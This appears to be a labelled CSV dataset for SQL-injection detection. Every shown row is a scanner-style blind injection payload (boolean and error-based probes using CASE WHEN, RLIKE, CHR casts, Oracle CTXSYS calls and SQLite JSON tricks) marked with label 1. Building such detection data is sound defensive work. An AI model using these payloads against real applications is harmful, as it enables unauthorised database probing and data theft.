Sentence,Label
"1"") AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- YHtv",1
"1"") AND 3863=(SELECT (CASE WHEN (3863=1249) THEN 3863 ELSE (SELECT 1249 UNION SELECT 8717) END))-- mtQE",1
"1"" AND 8948=(SELECT (CASE WHEN (8948=9707) THEN 8948 ELSE (SELECT 9707 UNION SELECT 6292) END))-- oanX",1
"1"" AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- VMNF",1
"1"" AND 6895=(SELECT (CASE WHEN (6895=3348) THEN 6895 ELSE (SELECT 3348 UNION SELECT 1964) END))-- wALm",1
1) AND 5985=2385-- LfXg,1
1) AND 1961=1961-- NXir,1
1) AND 8764=2892-- NYnI,1
1)) AND 3558=6141-- gbet,1
1)) AND 1961=1961-- NUrM,1
1)) AND 7066=1005-- eAPl,1
1') AND 3457=5611-- xJtJ,1
1') AND 1961=1961-- DViO,1
1') AND 6067=3707-- BZjT,1
1')) AND 5084=5477-- dWxo,1
1')) AND 1961=1961-- HMjX,1
1')) AND 2735=3389-- CkTs,1
1' AND 5543=8380-- mYVk,1
1' AND 1961=1961-- ECkw,1
1' AND 4290=3234-- LUIp,1
1%' AND 5946=5416-- OgIJ,1
1%' AND 1961=1961-- mexB,1
1%' AND 9671=5687-- OPYh,1
"1"") AND 9099=7887-- Nifs",1
"1"") AND 1961=1961-- Rfqc",1
"1"") AND 4144=9347-- lIzy",1
"1"" AND 5772=1521-- wgPy",1
"1"" AND 1961=1961-- tChA",1
"1"" AND 6525=1127-- aGCD",1
1) RLIKE (SELECT (CASE WHEN (9685=1563) THEN 1 ELSE 0x28 END)) AND (8606=8606,1
1) RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND (5967=5967,1
1) RLIKE (SELECT (CASE WHEN (5630=9961) THEN 1 ELSE 0x28 END)) AND (6121=6121,1
1)) RLIKE (SELECT (CASE WHEN (4952=1135) THEN 1 ELSE 0x28 END)) AND ((9979=9979,1
1)) RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ((1714=1714,1
1)) RLIKE (SELECT (CASE WHEN (9452=2075) THEN 1 ELSE 0x28 END)) AND ((6365=6365,1
1 RLIKE (SELECT (CASE WHEN (9888=2231) THEN 1 ELSE 0x28 END)),1
1 RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)),1
1 RLIKE (SELECT (CASE WHEN (2449=1070) THEN 1 ELSE 0x28 END)),1
1 RLIKE (SELECT (CASE WHEN (2223=3560) THEN 1 ELSE 0x28 END))-- TtAU,1
1 RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END))-- ifVU,1
1 RLIKE (SELECT (CASE WHEN (3187=6414) THEN 1 ELSE 0x28 END))-- krAQ,1
1') RLIKE (SELECT (CASE WHEN (4118=5789) THEN 1 ELSE 0x28 END)) AND ('aaMm'='aaMm,1
1') RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ('YBWk'='YBWk,1
1') RLIKE (SELECT (CASE WHEN (3437=1411) THEN 1 ELSE 0x28 END)) AND ('psku'='psku,1
1')) RLIKE (SELECT (CASE WHEN (5094=2967) THEN 1 ELSE 0x28 END)) AND (('liLF'='liLF,1
1')) RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND (('zPUa'='zPUa,1
1')) RLIKE (SELECT (CASE WHEN (4032=1747) THEN 1 ELSE 0x28 END)) AND (('nwZP'='nwZP,1
1' RLIKE (SELECT (CASE WHEN (1557=4709) THEN 1 ELSE 0x28 END)) AND 'wWHo'='wWHo,1
1' RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND 'HQtL'='HQtL,1
1' RLIKE (SELECT (CASE WHEN (9465=1695) THEN 1 ELSE 0x28 END)) AND 'ZMHj'='ZMHj,1
1') RLIKE (SELECT (CASE WHEN (4647=9410) THEN 1 ELSE 0x28 END)) AND ('KGLM' LIKE 'KGLM,1
1') RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ('vGDI' LIKE 'vGDI,1
1') RLIKE (SELECT (CASE WHEN (7085=6819) THEN 1 ELSE 0x28 END)) AND ('qYFa' LIKE 'qYFa,1
1%' RLIKE (SELECT (CASE WHEN (1671=7580) THEN 1 ELSE 0x28 END)) AND 'cQnt%'='cQnt,1
1%' RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND 'Eocq%'='Eocq,1
1%' RLIKE (SELECT (CASE WHEN (7658=6622) THEN 1 ELSE 0x28 END)) AND 'jYUC%'='jYUC,1
1' RLIKE (SELECT (CASE WHEN (8198=2644) THEN 1 ELSE 0x28 END)) AND 'lqYb' LIKE 'lqYb,1
1' RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND 'aChz' LIKE 'aChz,1
1' RLIKE (SELECT (CASE WHEN (7052=8413) THEN 1 ELSE 0x28 END)) AND 'dnro' LIKE 'dnro,1
"1"") RLIKE (SELECT (CASE WHEN (1531=3572) THEN 1 ELSE 0x28 END)) AND (""vfJp""=""vfJp",1
"1"") RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND (""LQnv""=""LQnv",1
"1"") RLIKE (SELECT (CASE WHEN (1383=5474) THEN 1 ELSE 0x28 END)) AND (""SGsN""=""SGsN",1
"1"" RLIKE (SELECT (CASE WHEN (4237=8249) THEN 1 ELSE 0x28 END)) AND ""cxJH""=""cxJH",1
"1"" RLIKE (SELECT (CASE WHEN (8833=8833) THEN 1 ELSE 0x28 END)) AND ""drqW""=""drqW",1
"1"" RLIKE (SELECT (CASE WHEN (6818=5374) THEN 1 ELSE 0x28 END)) AND ""KlDe""=""KlDe",1
1) AND (SELECT (CASE WHEN (3178=3083) THEN NULL ELSE CAST((CHR(106)||CHR(104)||CHR(104)||CHR(97)) AS NUMERIC) END)) IS NULL AND (3627=3627,1
1) AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND (9762=9762,1
1) AND (SELECT (CASE WHEN (3327=5419) THEN NULL ELSE CAST((CHR(71)||CHR(73)||CHR(67)||CHR(121)) AS NUMERIC) END)) IS NULL AND (3748=3748,1
1)) AND (SELECT (CASE WHEN (2756=1066) THEN NULL ELSE CAST((CHR(78)||CHR(68)||CHR(77)||CHR(106)) AS NUMERIC) END)) IS NULL AND ((9881=9881,1
1)) AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ((4738=4738,1
1)) AND (SELECT (CASE WHEN (5792=4573) THEN NULL ELSE CAST((CHR(114)||CHR(99)||CHR(81)||CHR(106)) AS NUMERIC) END)) IS NULL AND ((9090=9090,1
1 AND (SELECT (CASE WHEN (2257=6939) THEN NULL ELSE CAST((CHR(102)||CHR(108)||CHR(76)||CHR(88)) AS NUMERIC) END)) IS NULL,1
1 AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL,1
1 AND (SELECT (CASE WHEN (6847=7566) THEN NULL ELSE CAST((CHR(118)||CHR(116)||CHR(121)||CHR(108)) AS NUMERIC) END)) IS NULL,1
1 AND (SELECT (CASE WHEN (2446=2114) THEN NULL ELSE CAST((CHR(103)||CHR(103)||CHR(99)||CHR(100)) AS NUMERIC) END)) IS NULL-- iDYI,1
1 AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL-- GozS,1
1 AND (SELECT (CASE WHEN (4987=6500) THEN NULL ELSE CAST((CHR(104)||CHR(66)||CHR(102)||CHR(74)) AS NUMERIC) END)) IS NULL-- GqID,1
1') AND (SELECT (CASE WHEN (9093=4361) THEN NULL ELSE CAST((CHR(88)||CHR(107)||CHR(119)||CHR(115)) AS NUMERIC) END)) IS NULL AND ('oONS'='oONS,1
1') AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ('Fydz'='Fydz,1
1') AND (SELECT (CASE WHEN (9297=2953) THEN NULL ELSE CAST((CHR(115)||CHR(108)||CHR(103)||CHR(113)) AS NUMERIC) END)) IS NULL AND ('jqRj'='jqRj,1
1')) AND (SELECT (CASE WHEN (1523=6338) THEN NULL ELSE CAST((CHR(109)||CHR(84)||CHR(87)||CHR(82)) AS NUMERIC) END)) IS NULL AND (('joDh'='joDh,1
1')) AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND (('XQzb'='XQzb,1
1')) AND (SELECT (CASE WHEN (6044=3181) THEN NULL ELSE CAST((CHR(86)||CHR(106)||CHR(119)||CHR(114)) AS NUMERIC) END)) IS NULL AND (('VsHI'='VsHI,1
1' AND (SELECT (CASE WHEN (5180=1517) THEN NULL ELSE CAST((CHR(80)||CHR(78)||CHR(90)||CHR(66)) AS NUMERIC) END)) IS NULL AND 'AQBp'='AQBp,1
1' AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'nUIE'='nUIE,1
1' AND (SELECT (CASE WHEN (1895=5376) THEN NULL ELSE CAST((CHR(81)||CHR(71)||CHR(84)||CHR(85)) AS NUMERIC) END)) IS NULL AND 'XUAi'='XUAi,1
1') AND (SELECT (CASE WHEN (2410=6211) THEN NULL ELSE CAST((CHR(115)||CHR(75)||CHR(81)||CHR(77)) AS NUMERIC) END)) IS NULL AND ('YjNf' LIKE 'YjNf,1
1') AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ('mdEm' LIKE 'mdEm,1
1') AND (SELECT (CASE WHEN (3207=4649) THEN NULL ELSE CAST((CHR(90)||CHR(121)||CHR(77)||CHR(89)) AS NUMERIC) END)) IS NULL AND ('Wbwx' LIKE 'Wbwx,1
1%' AND (SELECT (CASE WHEN (6167=7090) THEN NULL ELSE CAST((CHR(88)||CHR(81)||CHR(71)||CHR(77)) AS NUMERIC) END)) IS NULL AND 'VkDR%'='VkDR,1
1%' AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'AqKy%'='AqKy,1
1%' AND (SELECT (CASE WHEN (7333=8573) THEN NULL ELSE CAST((CHR(83)||CHR(121)||CHR(81)||CHR(98)) AS NUMERIC) END)) IS NULL AND 'JnuZ%'='JnuZ,1
1' AND (SELECT (CASE WHEN (8727=7238) THEN NULL ELSE CAST((CHR(109)||CHR(72)||CHR(70)||CHR(115)) AS NUMERIC) END)) IS NULL AND 'lnLw' LIKE 'lnLw,1
1' AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'BhBj' LIKE 'BhBj,1
1' AND (SELECT (CASE WHEN (3237=2233) THEN NULL ELSE CAST((CHR(78)||CHR(114)||CHR(117)||CHR(121)) AS NUMERIC) END)) IS NULL AND 'XQEO' LIKE 'XQEO,1
"1"") AND (SELECT (CASE WHEN (1493=9775) THEN NULL ELSE CAST((CHR(98)||CHR(74)||CHR(120)||CHR(89)) AS NUMERIC) END)) IS NULL AND (""ycWv""=""ycWv",1
"1"") AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND (""GHpW""=""GHpW",1
"1"") AND (SELECT (CASE WHEN (1006=5665) THEN NULL ELSE CAST((CHR(110)||CHR(104)||CHR(81)||CHR(106)) AS NUMERIC) END)) IS NULL AND (""SOvg""=""SOvg",1
"1"" AND (SELECT (CASE WHEN (1871=4448) THEN NULL ELSE CAST((CHR(101)||CHR(89)||CHR(102)||CHR(88)) AS NUMERIC) END)) IS NULL AND ""aZij""=""aZij",1
"1"" AND (SELECT (CASE WHEN (4748=4748) THEN NULL ELSE CAST((CHR(109)||CHR(109)||CHR(71)||CHR(119)) AS NUMERIC) END)) IS NULL AND ""kAzv""=""kAzv",1
"1"" AND (SELECT (CASE WHEN (3178=3561) THEN NULL ELSE CAST((CHR(68)||CHR(87)||CHR(112)||CHR(72)) AS NUMERIC) END)) IS NULL AND ""LEQV""=""LEQV",1
"1) AND (SELECT (CASE WHEN (1439=1955) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1439) END) FROM DUAL) IS NULL AND (5450=5450",1
"1) AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND (5030=5030",1
"1) AND (SELECT (CASE WHEN (7838=3165) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7838) END) FROM DUAL) IS NULL AND (2149=2149",1
"1)) AND (SELECT (CASE WHEN (2226=7999) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2226) END) FROM DUAL) IS NULL AND ((8508=8508",1
"1)) AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ((4820=4820",1
"1)) AND (SELECT (CASE WHEN (7429=1114) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7429) END) FROM DUAL) IS NULL AND ((9628=9628",1
"1 AND (SELECT (CASE WHEN (2805=1358) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2805) END) FROM DUAL) IS NULL",1
"1 AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL",1
"1 AND (SELECT (CASE WHEN (3065=5857) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3065) END) FROM DUAL) IS NULL",1
"1 AND (SELECT (CASE WHEN (4528=4828) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4528) END) FROM DUAL) IS NULL-- UAoU",1
"1 AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL-- pESV",1
"1 AND (SELECT (CASE WHEN (4754=4216) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4754) END) FROM DUAL) IS NULL-- knlf",1
"1') AND (SELECT (CASE WHEN (1968=6782) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1968) END) FROM DUAL) IS NULL AND ('dOGP'='dOGP",1
"1') AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ('gbkA'='gbkA",1
"1') AND (SELECT (CASE WHEN (5700=2181) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5700) END) FROM DUAL) IS NULL AND ('aIUq'='aIUq",1
"1')) AND (SELECT (CASE WHEN (1715=2480) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1715) END) FROM DUAL) IS NULL AND (('HYCD'='HYCD",1
"1')) AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND (('JfLx'='JfLx",1
"1')) AND (SELECT (CASE WHEN (4866=5827) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4866) END) FROM DUAL) IS NULL AND (('AFix'='AFix",1
"1' AND (SELECT (CASE WHEN (7903=6536) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7903) END) FROM DUAL) IS NULL AND 'rJah'='rJah",1
"1' AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND 'FyZO'='FyZO",1
"1' AND (SELECT (CASE WHEN (8262=9837) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8262) END) FROM DUAL) IS NULL AND 'qZhi'='qZhi",1
"1') AND (SELECT (CASE WHEN (6839=4667) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6839) END) FROM DUAL) IS NULL AND ('aqhf' LIKE 'aqhf",1
"1') AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ('RCej' LIKE 'RCej",1
"1') AND (SELECT (CASE WHEN (4752=9385) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4752) END) FROM DUAL) IS NULL AND ('deUf' LIKE 'deUf",1
"1%' AND (SELECT (CASE WHEN (1617=1745) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1617) END) FROM DUAL) IS NULL AND 'zlNw%'='zlNw",1
"1%' AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND 'qPsC%'='qPsC",1
"1%' AND (SELECT (CASE WHEN (6055=9145) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6055) END) FROM DUAL) IS NULL AND 'KQKH%'='KQKH",1
"1' AND (SELECT (CASE WHEN (8549=9000) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8549) END) FROM DUAL) IS NULL AND 'bQQR' LIKE 'bQQR",1
"1' AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND 'DPps' LIKE 'DPps",1
"1' AND (SELECT (CASE WHEN (3676=7742) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3676) END) FROM DUAL) IS NULL AND 'TXHo' LIKE 'TXHo",1
"1"") AND (SELECT (CASE WHEN (7944=2556) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7944) END) FROM DUAL) IS NULL AND (""WUTR""=""WUTR",1
"1"") AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND (""OrfH""=""OrfH",1
"1"") AND (SELECT (CASE WHEN (6429=5858) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6429) END) FROM DUAL) IS NULL AND (""cpOJ""=""cpOJ",1
"1"" AND (SELECT (CASE WHEN (5970=5078) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5970) END) FROM DUAL) IS NULL AND ""eyTB""=""eyTB",1
"1"" AND (SELECT (CASE WHEN (7367=7367) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7367) END) FROM DUAL) IS NULL AND ""NqKs""=""NqKs",1
"1"" AND (SELECT (CASE WHEN (5108=6524) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5108) END) FROM DUAL) IS NULL AND ""fNrj""=""fNrj",1
"1) AND CASE WHEN 6792=2327 THEN 6792 ELSE JSON(CHAR(119,67,103,97)) END AND (8643=8643",1
"1) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (3441=3441",1
"1) AND CASE WHEN 3993=9645 THEN 3993 ELSE JSON(CHAR(66,71,73,67)) END AND (3378=3378",1
"1)) AND CASE WHEN 1210=8996 THEN 1210 ELSE JSON(CHAR(100,101,105,80)) END AND ((6973=6973",1
"1)) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ((2627=2627",1
"1)) AND CASE WHEN 2206=1776 THEN 2206 ELSE JSON(CHAR(112,120,70,80)) END AND ((2168=2168",1
"1 AND CASE WHEN 9349=2205 THEN 9349 ELSE JSON(CHAR(67,100,90,119)) END",1
"1 AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END",1
"1 AND CASE WHEN 3023=8622 THEN 3023 ELSE JSON(CHAR(117,121,110,87)) END",1
"1 AND CASE WHEN 9258=6175 THEN 9258 ELSE JSON(CHAR(109,118,110,66)) END-- vGJf",1
"1 AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END-- BHKr",1
"1 AND CASE WHEN 2301=2472 THEN 2301 ELSE JSON(CHAR(70,82,83,82)) END-- CYzx",1
"1') AND CASE WHEN 4875=1123 THEN 4875 ELSE JSON(CHAR(74,103,101,112)) END AND ('NCZl'='NCZl",1
"1') AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ('TTwg'='TTwg",1
"1') AND CASE WHEN 5640=9592 THEN 5640 ELSE JSON(CHAR(116,74,65,98)) END AND ('vJmG'='vJmG",1
"1')) AND CASE WHEN 1690=2944 THEN 1690 ELSE JSON(CHAR(88,122,90,72)) END AND (('zrIr'='zrIr",1
"1')) AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND (('pxPc'='pxPc",1
"1')) AND CASE WHEN 5546=1754 THEN 5546 ELSE JSON(CHAR(109,111,73,77)) END AND (('hawn'='hawn",1
"1' AND CASE WHEN 4981=5612 THEN 4981 ELSE JSON(CHAR(83,68,82,83)) END AND 'mTcL'='mTcL",1
"1' AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND 'Gttf'='Gttf",1
"1' AND CASE WHEN 1105=3634 THEN 1105 ELSE JSON(CHAR(100,77,83,102)) END AND 'dUHs'='dUHs",1
"1') AND CASE WHEN 6464=6297 THEN 6464 ELSE JSON(CHAR(102,121,80,104)) END AND ('OyTc' LIKE 'OyTc",1
"1') AND CASE WHEN 8679=8679 THEN 8679 ELSE JSON(CHAR(100,78,76,111)) END AND ('yUcZ' LIKE 'yUcZ",1
"1') AND CASE WHEN 9677=4801 THEN 9677 ELSE JSON(CHAR(122,100,108,104)) END AND ('oavW' LIKE 'oavW",1
"1%' AND CASE WHEN 2760=9939 THEN 2760 ELSE JSON(CHAR(101,70,122,119)) END AND 'muHw%'='muHw",1
